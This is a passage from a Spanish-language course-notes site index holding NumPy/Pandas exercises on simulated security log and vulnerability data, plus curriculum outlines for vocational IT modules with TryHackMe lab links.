122])\nvulnerabilidades = np.array([7.5, 3.2, 8.9, 5.0, 9.8])\nEjercicio 1.3: Indexing y Slicing\n\nImprime el primer y el último tiempo de respuesta del array tiempos_respuesta.\nImprime los tiempos de respuesta desde el segundo hasta el cuarto elemento (inclusive).\nImprime todas las puntuaciones de vulnerabilidades que sean mayores o iguales a 7.0 (usa boolean indexing).\n\nEjercicio 1.4: Funciones Matemáticas Básicas\n\nCalcula e imprime el tiempo de respuesta medio, mínimo y máximo del array tiempos_respuesta usando funciones de NumPy (np.mean(), np.min(), np.max()).\n\nParte 2: Pandas Series\nEjercicio 2.1: Creación de Series\n\nCrea una Serie de Pandas llamada intentos_fallidos a partir de la lista [5, 10, 3, 1, 8], usando como índice los nombres de usuario [&#039;admin&#039;, &#039;guest&#039;, &#039;root&#039;, &#039;user1&#039;, &#039;test&#039;].\nImprime la Serie.\n\nEjercicio 2.2: Acceso a Elementos\n\nUsando la Serie intentos_fallidos:\n\nImprime el número de intentos fallidos del usuario ‘admin’.\nImprime el número de intentos fallidos del segundo usuario (usando acceso posicional).\nImprime los intentos fallidos de ‘guest’ y ‘test’ al mismo tiempo.\n\n\n\nusuarios = [&#039;admin&#039;, &#039;guest&#039;, &#039;root&#039;, &#039;user1&#039;, &#039;test&#039;]\ndatos_intentos = [5, 10, 3, 1, 8]\nintentos_fallidos = pd.Series(datos_intentos, index=usuarios)\nEjercicio 2.3: Operaciones y Filtrado\n\nUsando la Serie intentos_fallidos:\n\nImprime los usuarios que tuvieron más de 4 intentos fallidos.\nIncrementa en 1 el número de intentos fallidos para todos los usuarios e imprime la Serie resultante.\n\n\n\nParte 3: Pandas DataFrames\nEjercicio 3.1: Creación de DataFrame desde Diccionario\n\nCrea un DataFrame de Pandas llamado df_logs a partir del siguiente diccionario, simulando logs de acceso.\nImprime el DataFrame.\n\ndata = {\n    &#039;timestamp&#039;: [&#039;2025-04-15 20:00:01&#039;, &#039;2025-04-15 20:01:15&#039;, &#039;2025-04-15 20:01:30&#039;, &#039;2025-04-15 20:02:05&#039;, &#039;2025-04-15 20:03:10&#039;],\n    &#039;usuario&#039;: [&#039;user1&#039;, &#039;admin&#039;, &#039;user1&#039;, &#039;guest&#039;, &#039;admin&#039;],\n    &#039;ip_origen&#039;: [&#039;192.168.1.10&#039;, &#039;10.0.0.5&#039;, &#039;192.168.1.10&#039;, &#039;203.0.113.1&#039;, &#039;10.0.0.5&#039;],\n    &#039;accion&#039;: [&#039;login_success&#039;, &#039;login_success&#039;, &#039;file_access&#039;, &#039;login_failed&#039;, &#039;logout&#039;]\n}\n \ndf_logs = pd.DataFrame(data)\nprint(df_logs)\nEjercicio 3.2: Simulación de Lectura de CSV\n\nTenemos los siguientes datos simulados de un archivo CSV:\n\ntimestamp,source_ip,dest_ip,port,protocol,action\n2025-04-15 21:00:00,192.168.1.50,10.0.0.80,80,TCP,ALLOW\n2025-04-15 21:00:05,192.168.1.55,10.0.0.81,443,TCP,ALLOW\n2025-04-15 21:00:10,192.168.1.50,10.0.0.80,123,UDP,DENY\n2025-04-15 21:00:15,192.168.1.60,8.8.8.8,53,UDP,ALLOW\n2025-04-15 21:00:20,192.168.1.55,10.0.0.81,443,TCP,ALLOW\n\nUsa pd.read_csv() junto con StringIO() (importado al principio) para leer estos datos en un DataFrame llamado df_traffic.\nImprime el DataFrame.\n\ncsv_data = &quot;&quot;&quot;\ntimestamp,source_ip,dest_ip,port,protocol,action\n2025-04-15 21:00:00,192.168.1.50,10.0.0.80,80,TCP,ALLOW\n2025-04-15 21:00:05,192.168.1.55,10.0.0.81,443,TCP,ALLOW\n2025-04-15 21:00:10,192.168.1.50,10.0.0.80,123,UDP,DENY\n2025-04-15 21:00:15,192.168.1.60,8.8.8.8,53,UDP,ALLOW\n2025-04-15 21:00:20,192.168.1.55,10.0.0.81,443,TCP,ALLOW\n&quot;&quot;&quot;\n \n# Lee los datos usando pd.read_csv y StringIO\ndf_traffic = pd.read_csv(StringIO(csv_data))\nprint(df_traffic)\nEjercicio 3.3: Inspección Básica\n\nUsando el DataFrame df_traffic del ejercicio anterior:\n\nMuestra las primeras 3 filas (.head()).\nMuestra las últimas 2 filas (.tail()).\nMuestra información general del DataFrame (.info()). ¿Qué tipo de datos tiene cada columna?\nMuestra un resumen estadístico (si aplica, .describe()).\nMuestra los nombres de las columnas (.columns).\nMuestra las dimensiones del DataFrame (.shape).\n\n\n\nEjercicio 3.4: Selección de Columnas\n\nUsando df_traffic:\n\nSelecciona e imprime únicamente la columna ‘source_ip’.\nSelecciona e imprime las columnas ‘timestamp’, ‘source_ip’ y ‘action’.\n\n\n\nEjercicio 3.5: Selección de Filas (.loc y .iloc)\n\nUsando df_traffic:\n\nSelecciona e imprime la primera fila usando .iloc.\nSelecciona e imprime las filas con índice 1 y 3 usando .iloc.\nSelecciona e imprime la fila con índice 2 usando .loc.\nSelecciona e imprime las filas con índice 0 a 2 (inclusive) usando .loc.\n\n\n\nEjercicio 3.6: Filtrado de Filas (Boolean Indexing)\n\nUsando df_traffic:\n\nSelecciona e imprime todas las filas donde la acción (‘action’) sea ‘DENY’.\nSelecciona e imprime todas las filas donde el puerto (‘port’) sea 443.\nSelecciona e imprime todas las filas donde la IP origen (‘source_ip’) sea ‘192.168.1.55’.\nSelecciona e imprime todas las filas donde el protocolo sea ‘TCP’ Y la acción sea ‘ALLOW’.\n\n\n\nParte 4: Limpieza Básica de Datos\nEjercicio 4.1: Manejo de Nulos (NaN)\n\nVamos a crear un DataFrame con algunos valores faltantes:\n\ndata_vuls = {\n    &#039;cve_id&#039;: [&#039;CVE-2025-001&#039;, &#039;CVE-2025-002&#039;, &#039;CVE-2025-003&#039;, &#039;CVE-2025-004&#039;, &#039;CVE-2025-005&#039;],\n    &#039;producto&#039;: [&#039;WebServer&#039;, &#039;Database&#039;, &#039;WebServer&#039;, &#039;OS&#039;, &#039;Database&#039;],\n    &#039;puntuacion&#039;: [9.8, 7.5, np.nan, 5.0, 7.5],\n    &#039;vector&#039;: [&#039;AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&#039;, np.nan, &#039;AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N&#039;, &#039;AV:L/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N&#039;, np.nan]\n}\ndf_vuls = pd.DataFrame(data_vuls)\n\nImprime el DataFrame df_vuls.\nCuenta cuántos valores nulos hay en cada columna (.isnull().sum()).\nCrea un nuevo DataFrame df_vuls_filled donde los NaN en la columna ‘puntuacion’ se reemplacen por la media de esa columna (.fillna()).\nCrea un nuevo DataFrame df_vuls_dropped donde se eliminen las filas que contengan cualquier valor NaN (.dropna()).\nImprime df_vuls_filled y df_vuls_dropped.\n\ndata_vuls = {\n    &#039;cve_id&#039;: [&#039;CVE-2025-001&#039;, &#039;CVE-2025-002&#039;, &#039;CVE-2025-003&#039;, &#039;CVE-2025-004&#039;, &#039;CVE-2025-005&#039;],\n    &#039;producto&#039;: [&#039;WebServer&#039;, &#039;Database&#039;, &#039;WebServer&#039;, &#039;OS&#039;, &#039;Database&#039;],\n    &#039;puntuacion&#039;: [9.8, 7.5, np.nan, 5.0, 7.5],\n    &#039;vector&#039;: [&#039;AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&#039;, np.nan, &#039;AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N&#039;, &#039;AV:L/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N&#039;, np.nan]\n}\ndf_vuls = pd.DataFrame(data_vuls)\n \nprint(&quot;DataFrame Original:&quot;)\nprint(df_vuls)\nprint(&quot;\\nValores Nulos por Columna:&quot;)\n# Cuenta nulos aquí\n \n# Rellena nulos en &#039;puntuacion&#039; aquí\n# df_vuls_filled = ...\n# print(&quot;\\nDataFrame con Nulos Rellenos:&quot;)\n# print(df_vuls_filled)\n \n# Elimina filas con nulos aquí\n# df_vuls_dropped = ...\n# print(&quot;\\nDataFrame con Filas Nulas Eliminadas:&quot;)\n# print(df_vuls_dropped)\nEjercicio 4.2: Manejo de Duplicados\n\nConsidera el DataFrame df_traffic del ejercicio 3.2. Ya tenía una fila duplicada (índices 1 y 4).\nEncuentra las filas duplicadas en df_traffic usando .duplicated(). ¿Qué resultado te da?\nCrea un nuevo DataFrame df_traffic_unique eliminando las filas duplicadas de df_traffic usando .drop_duplicates(). Conserva la primera aparición.\nImprime df_traffic_unique y verifica su tamaño (.shape).\n\n# Asegúrate de tener df_traffic definido\n \n# Encuentra duplicados aquí\n \n# Elimina duplicados aquí\n# df_traffic_unique = ...\n \n# Imprime el resultado\n \nParte 5: Agrupación y Agregación (.groupby())\nEjercicio 5.1: Agrupar y Contar\n\nUsando el DataFrame df_logs (del ejercicio 3.1):\n\nAgrupa los logs por ‘usuario’ y cuenta cuántas acciones realizó cada uno (.size() o .count()).\nAgrupa los logs por ‘accion’ y cuenta cuántas veces ocurrió cada acción.\nAgrupa los logs por ‘ip_origen’ y cuenta cuántas acciones provinieron de cada IP.\n\n\n\n# Escribe tu código para el Ejercicio 5.1 aquí\n# Asegúrate de tener df_logs definido\ndata = {\n    &#039;timestamp&#039;: [&#039;2025-04-15 20:00:01&#039;, &#039;2025-04-15 20:01:15&#039;, &#039;2025-04-15 20:01:30&#039;, &#039;2025-04-15 20:02:05&#039;, &#039;2025-04-15 20:03:10&#039;],\n    &#039;usuario&#039;: [&#039;user1&#039;, &#039;admin&#039;, &#039;user1&#039;, &#039;guest&#039;, &#039;admin&#039;],\n    &#039;ip_origen&#039;: [&#039;192.168.1.10&#039;, &#039;10.0.0.5&#039;, &#039;192.168.1.10&#039;, &#039;203.0.113.1&#039;, &#039;10.0.0.5&#039;],\n    &#039;accion&#039;: [&#039;login_success&#039;, &#039;login_success&#039;, &#039;file_access&#039;, &#039;login_failed&#039;, &#039;logout&#039;]\n}\ndf_logs = pd.DataFrame(data)\n \n# Agrupa por usuario y cuenta\n \n# Agrupa por acción y cuenta\n \n# Agrupa por IP y cuenta\n \nEjercicio 5.2: Agrupar con Múltiples Columnas\n\nUsando el DataFrame df_logs:\n\nAgrupa por ‘usuario’ y ‘ip_origen’ simultáneamente y cuenta las ocurrencias.\n\n\n\nParte 6: Visualización Básica\nEjercicio 6.1: Histograma\n\nUsando el DataFrame df_traffic (el original o el df_traffic_unique):\n\nCrea un histograma de la columna ‘port’ usando .plot(kind=&#039;hist&#039;) o plt.hist().\nAñade un título al gráfico.\n\n\n\n# Asegúrate de tener df_traffic o df_traffic_unique definido\nplt.figure(figsize=(8, 4)) # Opcional: ajustar tamaño\n \n# Crea el histograma aquí\n \nplt.title(&#039;Distribución de Puertos Utilizados&#039;)\nplt.xlabel(&#039;Puerto&#039;)\nplt.ylabel(&#039;Frecuencia&#039;)\nplt.show()\n \nEjercicio 6.2: Gráfico de Barras\n\nUsando el DataFrame df_logs:\n\nCalcula la cuenta de cada ‘accion’ (puedes usar .value_counts() o .groupby().size()).\nCrea un gráfico de barras de las cuentas de acciones usando .plot(kind=&#039;bar&#039;).\nAñade un título y etiquetas a los ejes.\n\n\n\n# Asegúrate de tener df_logs definido\nplt.figure(figsize=(8, 5))\n \n# Calcula las cuentas de acciones aquí\n# action_counts = ...\n \n# Crea el gráfico de barras aquí\n# action_counts.plot(kind=&#039;bar&#039;, ...) \n \nplt.title(&#039;Número de Ocurrencias por Acción&#039;)\nplt.xlabel(&#039;Acción&#039;)\nplt.ylabel(&#039;Número de Ocurrencias&#039;)\nplt.xticks(rotation=45) # Rotar etiquetas si son largas\nplt.tight_layout() # Ajustar layout\nplt.show()"},"Python--and--Machine-learning/Python-librerías":{"title":"Python librerías","links":[],"tags":[],"content":"\nGame Development\n\nPygame: Used for developing 2D games.\nPiglet: Used for developing cross-platform games.\n\n\nMachine Learning\n\nTensorFlow: Used for building AI models, neural networks, and machine learning applications.\nPyTorch: Used for building AI models, neural networks, and machine learning applications.\nScikit-learn: Used for building AI models, neural networks, and machine learning applications.\nPyBrain: Used for building AI models, neural networks, and machine learning applications.\nTheano: Used for building AI models, neural networks, and machine learning applications.\n\n\nGUI Development\n\nTkinter: Used for creating graphical user interfaces.\nPyQt: Used for creating graphical user interfaces.\n\n\nComputer Vision\n\nOpenCV: Used for image and object recognition, facial recognition, and augmented reality.\n\n\nData Science\n\nNumPy: Used for numerical computing.\nPandas: Used for data manipulation.\nSciPy: Used for scientific calculations.\n\n\nWeb Development\n\nBeautiful Soup: Used for web scraping.\nMechanical Soup: Used for web scraping.\nSelenium: Used for web scraping.\nScrapy: Used for web scraping.\nDjango: Used for building websites and APIs.\nFlask: Used for building websites and APIs.\nFast API: Used for building websites and APIs.\n\n\nData Visualization\n\nMatplotlib: Used for creating charts, graphs, and plots.\nSeaborn: Used for creating charts, graphs, and plots.\nPlotly: Used for creating charts, graphs, and plots.\n\n\nDatabase Management\n\nSQLite: Used for creating and managing databases.\nSQLAlchemy: Used for creating and managing databases.\n\n\nImage Processing\n\nPillow: Used for image manipulation and editing.\n\n\nNatural Language Processing\n\nNLTK: Used for processing and analyzing human language.\nSpaCy: Used for processing and analyzing human language.\n\n\nOther Utilities\n\nSymPy: Used for symbolic math.\nPickle: Used for object serialization.\nTurtle: Used for drawing.\nPyWin32: Used for interacting with the Windows OS.\n\n\n"},"SMR/Aplicaciones-web/index":{"title":"index","links":[],"tags":[],"content":"Texto"},"SMR/Aplicaciones-web/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"Introducción a Python: tryhackme.com/r/room/pythonbasics"},"SMR/Redes-locales/index":{"title":"index","links":[],"tags":[],"content":"En primer lugar vamos a analizar los resultados de aprendizaje, criterios de evaluación, contenidos y posibles enlaces a las prácticas a realizar:"},"SMR/Redes-locales/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"Introducción a Linux: tryhackme.com/r/room/linuxfundamentalspart1\nIntro a redes: tryhackme.com/r/room/whatisnetworking"},"SMR/Seguridad-informática/index":{"title":"index","links":[],"tags":[],"content":"En primer lugar vamos a analizar los resultados de aprendizaje, criterios de evaluación, contenidos y posibles enlaces a las prácticas a realizar:"},"SMR/Seguridad-informática/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"RA - Criterios - Contenidos - Prácticas\nRA 1. Aplica medidas de seguridad pasiva en sistemas informáticos describiendo características de entornos y relacionándolas con sus necesidades.\nCriterios de evaluación:\na) Se ha valorado la importancia de mantener la información segura.\n\nContenido asociado: C 1.1 - Seguridad informática. Clasificación, técnicas y prácticas de tratamiento seguro de la información.\n\nPrácticas:\n\ntryhackme.com/r/room/careersincyber\ntryhackme.com/r/room/securityprinciples\n\nb) Se han descrito las diferencias entre seguridad física y lógica.\nc) Se han definido las características de la ubicación física y condiciones ambientales de los equipos y servidores.\n\nContenido asociado: C 1.2 - Ubicación y protección física de los equipos y servidores.\n\nd) Se ha identificado la necesidad de proteger físicamente los sistemas informáticos.\ne) Se ha verificado el funcionamiento de los sistemas de alimentación ininterrumpida.\n\nContenido asociado: C 1.3 - Sistemas de alimentación ininterrumpida.\n\nf) Se han seleccionado los puntos de aplicación de los sistemas de alimentación ininterrumpida.\ng) Se han esquematizado las características de una política de seguridad basada en listas de control de acceso.\nh) Se ha valorado la importancia de establecer una política de contraseñas.\ni) Se han valorado las ventajas que supone la utilización de sistemas biométricos.\nRA 2. Gestiona dispositivos de almacenamiento describiendo los procedimientos efectuados y aplicando técnicas para asegurar la integridad de la información.\nCriterios de evaluación\na) Se ha interpretado la documentación técnica relativa a la política de almacenamiento.\n\nContenido asociado: C 2.7 - Política de almacenamiento.\n\nb) Se han tenido en cuenta factores inherentes al almacenamiento de la información (rendimiento, disponibilidad, accesibilidad, entre otros).\n\nContenido asociado: C 2.1 - Almacenamiento de la información: rendimiento, disponibilidad, accesibilidad.\nContenido asociado: C 2.4 - Criptografía.\n\nc) Se han clasificado y enumerado los principales métodos de almacenamiento incluidos los sistemas de almacenamiento en red.\nd) Se han descrito las tecnologías de almacenamiento redundante y distribuido.\n\nContenido asociado: C 2.2 - Almacenamiento redundante y distribuido.\n\ne) Se han seleccionado estrategias para la realización de copias de seguridad.\n\nContenido asociado: C 2.5 - Copias de seguridad e imágenes de respaldo.\n\nf) Se ha tenido en cuenta la frecuencia y el esquema de rotación.\ng) Se han realizado copias de seguridad con distintas estrategias.\nh) Se han identificado las características de los medios de almacenamiento remotos y extraíbles.\n\nContenido asociado: C 2.6 - Medios de almacenamiento.\n\ni) Se han utilizado medios de almacenamiento remotos y extraíbles.\n\nContenido asociado: C 2.3 - Almacenamiento remoto y extraíble.\n\nj) Se han creado y restaurado imágenes de respaldo de sistemas en funcionamiento.\n\nContenido asociado: C 2.8 - Recuperación de datos\n\nRA 3. Aplica mecanismos de seguridad activa describiendo sus características y relacionándolas con las necesidades de uso del sistema informático.\nCriterios de evaluación\na) Se han seguido planes de contingencia para actuar ante fallos de seguridad.\n\nContenido asociado: C 3.5 - Utilización de cortafuegos en un sistema o servidor.\nContenido asociado: C 3.4 - Seguridad en los protocolos para comunicaciones inalámbricas.\nContenido asociado: C 3.6 - Listas de control de acceso.\nContenido asociado: C 3.7 - Política de contraseñas.\n\nb) Se han clasificado los principales tipos de software malicioso.\n\nContenido asociado: C 3.9 - Software malicioso. Clasificación, protección y desinfección.\n\nPrácticas\n\nAtaques comunes: tryhackme.com/r/room/commonattacks\n\nc) Se han realizado actualizaciones periódicas de los sistemas para corregir posibles vulnerabilidades.\n\nContenido asociado: C 3.10 - Auditorias de seguridad.\nContenido asociado: C 3.11 - Actualización de sistemas y aplicaciones.\n\nd) Se ha verificado el origen y la autenticidad de las aplicaciones que se instalan en los sistemas.\n\nContenido asociado: C 3.1 - Identificación digital.\nContenido asociado: C 3.2 - Sistemas biométricos de identificación.\nContenido asociado: C 3.3 - Firma electrónica y certificado digital.\n\ne) Se han instalado, probado y actualizado aplicaciones específicas para la detección y eliminación de software malicioso.\n\nContenido asociado: C 3.5 - Utilización de cortafuegos en un sistema o servidor.\n\nf) Se han aplicado técnicas de recuperación de datos.\n\nContenido asociado: C 3.8 - Recuperación de datos.\n\nRA 4. Asegura la privacidad de la información transmitida en redes informáticas describiendo vulnerabilidades e instalando software específico.\nCriterios de evaluación\na) Se ha identificado la necesidad de inventariar y controlar los servicios de red.\nb) Se ha contrastado la incidencia de las técnicas de ingeniería social en los fraudes informáticos y robos de información.\n\nContenido asociado: C 4.2 - Fraudes informáticos y robos de información.\n\nc) Se ha deducido la importancia de minimizar el volumen de tráfico generado por la publicidad y el correo no deseado.\n\nContenido asociado: C 4.7 - Publicidad y correo no deseado.\n\nd) Se han aplicado medidas para evitar la monitorización de redes cableadas.\n\nCotenido asociado: C 4.3 - Control de la monitorización en redes cableadas.\n\ne) Se han clasificado y valorado las propiedades de seguridad de los protocolos usados en redes inalámbricas.\n\nContenido asociado: C 4.4 - Seguridad en redes inalámbricas.\n\nPrácticas:\n\nWifi: tryhackme.com/r/room/wifihacking101\n\nf) Se han descrito sistemas de identificación como la firma electrónica, certificado digital, entre otros.\n\nContenido asociado: C 4.1 - Métodos para asegurar la privacidad de la información transmitida.\n\ng) Se han utilizado sistemas de identificación como la firma electrónica, certificado digital, entre otros.\n\nContenido asociado: C 4.5 - Sistemas de identificación: firma electrónica, certificados digitales y otros.\n\nh) Se ha instalado y configurado un cortafuegos en un equipo o servidor.\n\nContenido asociado: C 4.6 - Cortafuegos en equipos y servidores.\n\nRA 5. Reconoce la legislación y normativa sobre seguridad y protección de datos analizando las repercusiones de su incumplimiento.\nCriterios de evaluación\na) Se ha descrito la legislación sobre protección de datos de carácter personal.\n\nContenido asociado: C 5.1 - Legislación sobre protección de datos.\n\nb) Se ha determinado la necesidad de controlar el acceso a la información personal almacenada.\nc) Se han identificado las figuras legales que intervienen en el tratamiento y mantenimiento de los ficheros de datos.\nd) Se ha contrastado la obligación de poner a disposición de las personas los datos personales que les conciernen.\ne) Se ha descrito la legislación actual sobre los servicios de la sociedad de la información y comercio electrónico.\n\nContenido asociado: C 5.2 - Legislación sobre los servicios de la sociedad de la información y correo electrónico.\n\nf) Se han contrastado las normas sobre gestión de seguridad de la información.\nPrácticas:\n\ntryhackme.com/r/room/cybergovernanceregulation\n"},"SMR/Servicios-en-red/index":{"title":"index","links":[],"tags":[],"content":"En primer lugar vamos a analizar los resultados de aprendizaje, criterios de evaluación, contenidos y posibles enlaces a las prácticas a realizar:"},"SMR/Servicios-en-red/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"Introducción a Linux: tryhackme.com/r/room/linuxfundamentalspart1\nIntro a redes: tryhackme.com/r/room/whatisnetworking\nContinuamos con redes: tryhackme.com/r/room/networkservices"},"SMR/index":{"title":"SMR","links":["SMR/Aplicaciones-web/","SMR/Seguridad-informática/","SMR/Redes-locales/","SMR/Servicios-en-red/"],"tags":["SMR","Apuntes"],"content":"\n\n                  \n                  Warning\n                  \n                \n\nEsto es un trabajo en curso. Aún en una fase alfa.\n\n\nMateriales preparados para el Ciclo Formativo de Grado Medio de Sistemas Microinformáticos y Redes (SMR)\nInformación:\n\nwww.todofp.es/que-estudiar/familias-profesionales/informatica-comunicaciones/sistemas-microniformaticos-redes.html\n\nTemario de cada módulo profesional:\n\nAplicaciones Web: AWeb\nSeguridad Informática: SI\nRedes Locales: RL\nServicios en Red: SRed\n"},"index":{"title":"Apuntes y temario de SMR, DAW, CETI y otros","links":["CETI/","DAW/","SMR/","FP-Dual/"],"tags":["CETI","DAW","SMR","Apuntes","Temas","Exámenes","Prácticas"],"content":"\n\n                  \n                  Warning\n                  \n                \n\nEsto es un trabajo en curso. Aún en una fase alfa.\n\n\nApuntes y temario de SMR, DAW, CETI y otros\nApuntes CETI\n\nApuntes y temario de Ciberseguridad en Entornos de las Tecnologías de la Información: CETI\n\nApuntes DAW\n\nApuntes y temario de Desarrollo de Aplicaciones Web: DAW\n\nApuntes SMR\n\nApuntes y temario de Sistemas Microinformáticos y Redes: SMR\n\nApuntes FP Dual\n\nApuntes y temario de Normativa sobre FP Dual (Andalucía): FP dual\n"}}